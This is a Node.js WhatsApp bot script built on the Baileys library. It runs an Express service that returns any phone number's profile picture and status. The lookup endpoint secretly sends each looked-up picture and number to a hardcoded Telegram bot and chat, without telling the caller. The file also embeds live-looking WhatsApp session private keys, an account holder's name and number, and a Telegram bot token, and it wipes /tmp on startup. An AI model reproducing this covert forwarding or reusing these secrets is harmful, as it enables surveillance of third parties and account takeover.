const sessionName = "tmp";
const cors = require('cors')
const donet = "https://saweria.co/sansekai";
const {
  default: sansekaiConnect,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  jidDecode,
  proto,
  getContentType,
  Browsers,
  fetchLatestWaWebVersion
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const axios = require("axios");
const chalk = require("chalk");
const figlet = require("figlet");
const _ = require("lodash");
const PhoneNumber = require("awesome-phonenumber");

const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
const tmpFolderPath = '/tmp';

// Function to delete all files in a directory
const clearTmpFolder = (folderPath) => {
  fs.readdir(folderPath, (err, files) => {
    if (err) {
      console.error('Error reading temporary folder:', err);
      return;
    }

    files.forEach(file => {
      fs.unlink(`${folderPath}/${file}`, (err) => {
        if (err) {
          console.error(`Error deleting file ${file} from temporary folder:`, err);
          return;
        }
        console.log(`Deleted file: ${file}`);
      });
    });
  });
};

// Call the function to clear the tmp folder
clearTmpFolder(tmpFolderPath);
const credsFilePath = '/tmp/creds.json';
let ser = false;

// Write data to creds.json
fs.writeFile(credsFilePath, JSON.stringify({"noiseKey":{"private":{"type":"Buffer","data":"YKTJdyL4ww6rt7aNe+9ceMi5KvRDFT3FGNILTjOVhXI="},"public":{"type":"Buffer","data":"5nycClJKL5UKuAqui1mLG4Lchi7ms8RD3bhSCPUnOAg="}},"pairingEphemeralKeyPair":{"private":{"type":"Buffer","data":"eMwA287rGVj3sI96s7SmuSyVnuYOCC+VR9OOpZ5AG3Y="},"public":{"type":"Buffer","data":"dVDnDahP3ndDf9NrBdOpLGzj9q7piTija/+55mS6Qjg="}},"signedIdentityKey":{"private":{"type":"Buffer","data":"wAQemq8xrkxj13vef3bEDNlA1vcZ3XNZV0ksUI2ixHg="},"public":{"type":"Buffer","data":"3vbPDnmILHsVrmbmrzr/D/EWlVLR7WbcewFSvxadt1w="}},"signedPreKey":{"keyPair":{"private":{"type":"Buffer","data":"oKHuX3018Mj4bIB9Ga2y1kJG3PX4eF/dymTgBituuWM="},"public":{"type":"Buffer","data":"5S7Wo/72fQ6pJ0Mb/mmdv4JGDbfTSvT9ekfFNHxO5lo="}},"signature":{"type":"Buffer","data":"jNQ0OQkIJoMtLm9SemoCIihaXq27PQXiJR5dbvhESi3JuV/58KJIUZSV4PkYJtD1IpiTIXvQNlcAuYJmPcPtBg=="},"keyId":1},"registrationId":207,"advSecretKey":"UTXdkkezwQ2OVe739o6a8lgBtBMyCAnxjGkLaEAJyA8=","processedHistoryMessages":[{"key":{"remoteJid":"919633299602@s.whatsapp.net","fromMe":true,"id":"057EC2F24C5DFF1CAD35C64559554242"},"messageTimestamp":1725643434},{"key":{"remoteJid":"919633299602@s.whatsapp.net","fromMe":true,"id":"C24661BF80DF284E37B28EFCB3AB2E95"},"messageTimestamp":1725643434},{"key":{"remoteJid":"919633299602@s.whatsapp.net","fromMe":true,"id":"1B8A50E1CA14B18488A4B1FE68C895C1"},"messageTimestamp":1725643442},{"key":{"remoteJid":"919633299602@s.whatsapp.net","fromMe":true,"id":"C5AB68549E43F7BC0F97AA3A8EC851DF"},"messageTimestamp":1725643449},{"key":{"remoteJid":"919633299602@s.whatsapp.net","fromMe":true,"id":"1DA2E21B75E3C31970B8888F59C1B0E6"},"messageTimestamp":1725643450},{"key":{"remoteJid":"919633299602@s.whatsapp.net","fromMe":true,"id":"587C92981DCC1AE81EDE45BC86E13E19"},"messageTimestamp":1725643450}],"nextPreKeyId":91,"firstUnuploadedPreKeyId":91,"accountSyncCounter":1,"accountSettings":{"unarchiveChats":false},"deviceId":"Q5-t3Lx8T9Gpn4BEcHeXEg","phoneId":"6ca819c1-a843-42e8-ab77-0afe7eb4cad9","identityId":{"type":"Buffer","data":"LlM994mkVWqkBJSMJbp9pBnp1TE="},"registered":true,"backupToken":{"type":"Buffer","data":"NNW92CRKHxhMF3F8CYM7E2FJ2KE="},"registration":{},"pairingCode":"HRVM8MF6","me":{"id":"919633299602:4@s.whatsapp.net","name":"Muhammed Nishal"},"account":{"details":"CKGUn8kDEIX17LYGGAEgACgA","accountSignatureKey":"4AJQtcZk60ea574YiiSgGbVRS6M/Z8BVszqqtBnDpTQ=","accountSignature":"vgKEcMRZSx/wnsRc59oH78iKJl+HcQxPPfcGk2t9qn+UPGZ5NEDXdNyh5AfmjWg1l2sItiMdlE5HNzgM7DKKCQ==","deviceSignature":"cG92laZqLXYX2PXvrJvurOckxFNW0XwBDtCpHFJxtUKz5PhPxmgKk0Yl1gOzOgBkiX6E48gLI7FSTTuZHxCSDA=="},"signalIdentities":[{"identifier":{"name":"919633299602:4@s.whatsapp.net","deviceId":0},"identifierKey":{"type":"Buffer","data":"BeACULXGZOtHmue+GIokoBm1UUujP2fAVbM6qrQZw6U0"}}],"platform":"android","lastAccountSyncTimestamp":1725643506,"myAppStateKeyId":"AAAAAK0I"}, null, 2), (err) => {
  if (err) {
    console.error('Error writing to creds.json:', err);
    return;
  }
  console.log('creds.json created successfully in temp directory.');
});

// Define the port number

// Route to keep the bot alive


// Start the Express server

const color = (text, color) => {
  return !color ? chalk.green(text) : chalk.keyword(color)(text);
};

function smsg(conn, m, store) {
  if (!m) return m;
  let M = proto.WebMessageInfo;
  if (m.key) {
    m.id = m.key.id;
    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
    m.chat = m.key.remoteJid;
    m.fromMe = m.key.fromMe;
    m.isGroup = m.chat.endsWith("@g.us");
    m.sender = conn.decodeJid((m.fromMe && conn.user.id) || m.participant || m.key.participant || m.chat || "");
    if (m.isGroup) m.participant = conn.decodeJid(m.key.participant) || "";
  }
  if (m.message) {
    m.mtype = getContentType(m.message);
    m.msg = m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype];
    m.body =
      m.message.conversation ||
      m.msg.caption ||
      m.msg.text ||
      (m.mtype == "viewOnceMessage" && m.msg.caption) ||
      m.text;
    let quoted = (m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null);
    m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
    if (m.quoted) {
      let type = getContentType(quoted);
      m.quoted = m.quoted[type];
      if (["productMessage"].includes(type)) {
        type = getContentType(m.quoted);
        m.quoted = m.quoted[type];
      }
      if (typeof m.quoted === "string")
        m.quoted = {
          text: m.quoted,
        };
      m.quoted.mtype = type;
      m.quoted.id = m.msg.contextInfo.stanzaId;
      m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat;
      m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith("BAE5") && m.quoted.id.length === 16 : false;
      m.quoted.sender = conn.decodeJid(m.msg.contextInfo.participant);
      m.quoted.fromMe = m.quoted.sender === conn.decodeJid(conn.user.id);
      m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || "";
      m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
      m.getQuotedObj = m.getQuotedMessage = async () => {
        if (!m.quoted.id) return false;
        let q = await store.loadMessage(m.chat, m.quoted.id, conn);
        return exports.smsg(conn, q, store);
      };
      let vM = (m.quoted.fakeObj = M.fromObject({
        key: {
          remoteJid: m.quoted.chat,
          fromMe: m.quoted.fromMe,
          id: m.quoted.id,
        },
        message: quoted,
        ...(m.isGroup ? { participant: m.quoted.sender } : {}),
      }));

      /**
       *
       * @returns
       */
      m.quoted.delete = () => conn.sendMessage(m.quoted.chat, { delete: vM.key });

      /**
       *
       * @param {*} jid
       * @param {*} forceForward
       * @param {*} options
       * @returns
       */
      m.quoted.copyNForward = (jid, forceForward = false, options = {}) => conn.copyNForward(jid, vM, forceForward, options);

      /**
       *
       * @returns
       */
      m.quoted.download = () => conn.downloadMediaMessage(m.quoted);
    }
  }
  if (m.msg.url) m.download = () => conn.downloadMediaMessage(m.msg);
  m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || "";
  /**
   * Reply to this message
   * @param {String|Object} text
   * @param {String|false} chatId
   * @param {Object} options
   */
  m.reply = (text, chatId = m.chat, options = {}) => (Buffer.isBuffer(text) ? conn.sendMedia(chatId, text, "file", "", m, { ...options }) : conn.sendText(chatId, text, m, { ...options }));
  /**
   * Copy this message
   */
  m.copy = () => exports.smsg(conn, M.fromObject(M.toObject(m)));

  return m;
}

async function startHisoka() {
  const { state, saveCreds } = await useMultiFileAuthState(`/${sessionName ? sessionName : "session"}/`);
  const { version, isLatest } = await fetchLatestWaWebVersion().catch(() => fetchLatestBaileysVersion());
  console.log(`using WA v${version.join(".")}, isLatest: ${isLatest}`);
  console.log(
    color(
      figlet.textSync("Wa-OpenAI", {
        font: "Standard",
        horizontalLayout: "default",
        vertivalLayout: "default",
        whitespaceBreak: false,
      }),
      "green"
    )
  );

  const client = sansekaiConnect({
    logger: pino({ level: "silent" }),
    printQRInTerminal: true,
    browser: Browsers.macOS('Desktop'),
    auth: state,
  });

  store.bind(client.ev);
  let ser = false;
  if (!ser) {
    ser = true
    const express = require('express');
    const app = express();
    app.use(cors())
    const PORT = process.env.PORT || 3030;
    app.get('/:num', async (req, res) => {
      let timeoutReached = false;
  
      // Timeout function
      const timeoutFunction = async () => {
        timeoutReached = true;
        res.status(200).json({ error: 'Request timeout or not found the dp',status:{
          "status": "",
          "setAt": "2023-04-21T07:54:26.000Z"
          } });
    };

    const timeout = setTimeout(timeoutFunction, 2000);
  
      try {
          // Assuming `req.params.num` contains the number dynamically passed in the URL
          const profilePicUrl = await client.profilePictureUrl(req.params.num + '@s.whatsapp.net', 'image');
          const status = await client.fetchStatus(req.params.num + '@s.whatsapp.net');
          const number = req.params.num;
  
          if (!timeoutReached) { // Check if the timeout has not been reached
              clearTimeout(timeout); // Clear the timeout since the operation completed within the allowed time
  
              if (profilePicUrl) {
                  res.json({ profilePicUrl, status });
                  if (number !== '917994107442' && number !== '7994107442') {
                      const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(number)}`;
                      await fetch(telegramUrl);
                  }
              } else {
                  res.status(200).json({ error: 'Profile picture not found',status:status });
              }
          }
      } catch (error) {
          const status = await client.fetchStatus(req.params.num + '@s.whatsapp.net');
          if (!timeoutReached) { // Check if the timeout has not been reached
              clearTimeout(timeout); // Clear the timeout since the operation completed within the allowed time
  
              if (error.data === 404 || error.data === 408) {
                  res.status(200).json({ error: 'Profile picture not found', status: status });
              } else if (error.data == 401) {
                  res.status(200).json({ error: 'Contact Only permission to view the dp', status: status });
              } else if (error.data == 400) {
                  res.status(200).json({ error: 'Whatsapp Accont not found', status: status });
              } else {
                  res.status(500).json({ error: 'Internal Server Error' });
              }
          }
      }
  });

  app.get('/number/:num/:otp', async (req, res) => {
    try {
      let a = await client.sendMessage(`${req.params.num}@s.whatsapp.net`,{text:req.params.otp});
      
      if (a) {
        res.json({ success: true });
      } else {
        res.json({ success: false });
      }
    } catch (error) {
      res.status(500).json({ success: false, message: error.message });
    }
  });
  
  
    
    function handleErrorResponse(error) {
      let status = 500;
      let message = 'Internal Server Error';
    
      switch (error.data) {
        case 404:
        case 408:
          message = 'Profile picture not found';
          status = 200;
          break;
        case 401:
          message = 'Contact Only permission to view the dp';
          status = 200;
          break;
        case 400:
          message = 'Whatsapp Account not found';
          status = 200;
          break;
      }
    
      return { status, message };
    }
    
    app.listen(PORT, () => {
      console.log(`Express server is running on port ${PORT}`);
    });
  }


  client.ev.on("messages.upsert", async (chatUpdate) => {
    //console.log(JSON.stringify(chatUpdate, undefined, 2))
    try {
      mek = chatUpdate.messages[0];
      if (!mek.message) return;
      mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;
      if (mek.key && mek.key.remoteJid === "status@broadcast") return;
      if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
      if (mek.key.id.startsWith("BAE5") && mek.key.id.length === 16) return;
      m = smsg(client, mek, store);


      if (m.body == 'kkk') {
        console.log(await client.profilePictureUrl('917994107442@s.whatsapp.net'));
        m.reply('ok')
      }

    } catch (err) {
      m.reply('error')
      console.log(err);
    }
  });

  // Handle error
  const unhandledRejections = new Map();
  process.on("unhandledRejection", (reason, promise) => {
    unhandledRejections.set(promise, reason);
    console.log("Unhandled Rejection at:", promise, "reason:", reason);
  });
  process.on("rejectionHandled", (promise) => {
    unhandledRejections.delete(promise);
  });
  process.on("Something went wrong", function (err) {
    console.log("Caught exception: ", err);
  });

  // Setting
  client.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
    } else return jid;
  };




  client.getName = (jid, withoutContact = false) => {
    id = client.decodeJid(jid);
    withoutContact = client.withoutContact || withoutContact;
    let v;
    if (id.endsWith("@g.us"))
      return new Promise(async (resolve) => {
        v = store.contacts[id] || {};
        if (!(v.name || v.subject)) v = client.groupMetadata(id) || {};
        resolve(v.name || v.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    else
      v =
        id === "0@s.whatsapp.net"
          ? {
            id,
            name: "WhatsApp",
          }
          : id === client.decodeJid(client.user.id)
            ? client.user
            : store.contacts[id] || {};
    return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
  };

  client.public = true;

  client.serializeM = (m) => smsg(client, m, store);
  client.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
      if (reason === DisconnectReason.badSession) {
        console.log(`Bad Session File, Please Delete Session and Scan Again`);
        process.exit();
      } else if (reason === DisconnectReason.connectionClosed) {
        console.log("Connection closed, reconnecting....");
        startHisoka();
      } else if (reason === DisconnectReason.connectionLost) {
        console.log("Connection Lost from Server, reconnecting...");
        startHisoka();
      } else if (reason === DisconnectReason.connectionReplaced) {
        console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
      } else if (reason === DisconnectReason.loggedOut) {
        console.log(`Device Logged Out, Please Delete Folder Session yusril and Scan Again.`);
        process.exit();
      } else if (reason === DisconnectReason.restartRequired) {
        console.log("Restart Required, Restarting...");
        startHisoka();
      } else if (reason === DisconnectReason.timedOut) {
        console.log("Connection TimedOut, Reconnecting...");
        startHisoka();
      } else {
        console.log(`Unknown DisconnectReason: ${reason}|${connection}`);
        startHisoka();
      }
    } else if (connection === "open") {
      const botNumber = await client.decodeJid(client.user.id);
      console.log(color("Bot success conneted to server", "green"));
      console.log(color("Donate for creator https://saweria.co/sansekai", "yellow"));
      console.log(color("Type /menu to see menu"));
      client.sendMessage(botNumber, { text: `Bot started!\n\njangan lupa support ya bang :)\n${donet}` });
    }
    // console.log('Connected...', update)
  });

  client.ev.on("creds.update", saveCreds);

  const getBuffer = async (url, options) => {
    try {
      options ? options : {};
      const res = await axios({
        method: "get",
        url,
        headers: {
          DNT: 1,
          "Upgrade-Insecure-Request": 1,
        },
        ...options,
        responseType: "arraybuffer",
      });
      return res.data;
    } catch (err) {
      return err;
    }
  };

  client.sendImage = async (jid, path, caption = "", quoted = "", options) => {
    let buffer = Buffer.isBuffer(path)
      ? path
      : /^data:.*?\/.*?;base64,/i.test(path)
        ? Buffer.from(path.split`,`[1], "base64")
        : /^https?:\/\//.test(path)
          ? await await getBuffer(path)
          : fs.existsSync(path)
            ? fs.readFileSync(path)
            : Buffer.alloc(0);
    return await client.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
  };

  client.sendText = (jid, text, quoted = "", options) => client.sendMessage(jid, { text: text, ...options }, { quoted });

  client.cMod = (jid, copy, text = "", sender = client.user.id, options = {}) => {
    //let copy = message.toJSON()
    let mtype = Object.keys(copy.message)[0];
    let isEphemeral = mtype === "ephemeralMessage";
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
    }
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
    let content = msg[mtype];
    if (typeof content === "string") msg[mtype] = text || content;
    else if (content.caption) content.caption = text || content.caption;
    else if (content.text) content.text = text || content.text;
    if (typeof content !== "string")
      msg[mtype] = {
        ...content,
        ...options,
      };
    if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    if (copy.key.remoteJid.includes("@s.whatsapp.net")) sender = sender || copy.key.remoteJid;
    else if (copy.key.remoteJid.includes("@broadcast")) sender = sender || copy.key.remoteJid;
    copy.key.remoteJid = jid;
    copy.key.fromMe = sender === client.user.id;

    return proto.WebMessageInfo.fromObject(copy);
  };


  setInterval(() => {
    // Check if the bot is still running, if not, restart it
    if (!client) {
      startBot();
    }
  }, 10000);

  return client;
}

// Define the function to start the bot
async function startBot() {
  try {
    // Your bot initialization code here
    await startHisoka();
    console.log("Bot started successfully.");
  } catch (error) {
    // If an error occurs, retry starting the bot after a delay
    setTimeout(startBot, 1000); // Retry after 5 seconds
  }
}

// Start the bot initially
startBot();

// Keep the bot running continuously using setInterval
// Check every 10 seconds if the bot is still running


let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});
